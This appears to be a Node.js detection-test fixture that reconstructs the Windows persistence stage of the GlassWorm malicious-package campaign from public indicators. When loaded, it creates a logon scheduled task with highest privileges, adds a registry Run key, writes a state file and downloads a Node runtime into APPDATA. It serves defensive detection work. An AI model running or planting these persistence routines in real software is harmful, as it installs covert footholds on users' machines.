// SANITIZED TEST FIXTURE — reconstructed from public IOCs for detection testing
// Wave 5: Windows Persistence Mechanisms (Mar 2026)
// Source: Aikido "GlassWorm Strikes Popular React Native Phone Number Packages"
// Pattern: schtasks, registry Run key, init.json state file, Node.js runtime download

const { exec, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');

// Create persistence via scheduled task
function createScheduledTask() {
    const taskName = 'NodeJS_Runtime_Update';
    const taskCommand = `schtasks /create /tn "${taskName}" /tr "node ${path.join(__dirname, 'loader.js')}" /sc onlogon /rl highest /f`;
    
    exec(taskCommand, (err, stdout, stderr) => {
        if (err) {
            console.error('Failed to create scheduled task:', err);
        }
    });
}

// Create persistence via registry Run key
function createRegistryPersistence() {
    const psCommand = `powershell -Command "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'NodeRuntime' -Value 'node ${path.join(__dirname, 'loader.js')}' -Force"`;
    
    exec(psCommand, (err, stdout, stderr) => {
        if (err) {
            console.error('Failed to create registry entry:', err);
        }
    });
}

// Create init.json state file
function createStateFile() {
    const initPath = path.join(process.env.HOME || process.env.USERPROFILE, 'init.json');
    const state = {
        installed: true,
        version: '22.0.0',
        lastCheck: new Date().toISOString(),
        persistence: 'active'
    };
    
    fs.writeFileSync(initPath, JSON.stringify(state, null, 2));
}

// Download Node.js runtime to %APPDATA%
function downloadNodeRuntime() {
    const appDataDir = process.env.APPDATA || path.join(process.env.HOME || '', '.node');
    const nodeDir = path.join(appDataDir, '_node_x86');
    
    if (!fs.existsSync(nodeDir)) {
        fs.mkdirSync(nodeDir, { recursive: true });
    }
    
    const nodePath = path.join(nodeDir, 'node.exe');
    const file = fs.createWriteStream(nodePath);
    
    https.get('https://nodejs.org/dist/v22.0.0/win-x86/node.exe', (response) => {
        response.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    });
}

// Execute all persistence mechanisms
createScheduledTask();
createRegistryPersistence();
createStateFile();
downloadNodeRuntime();
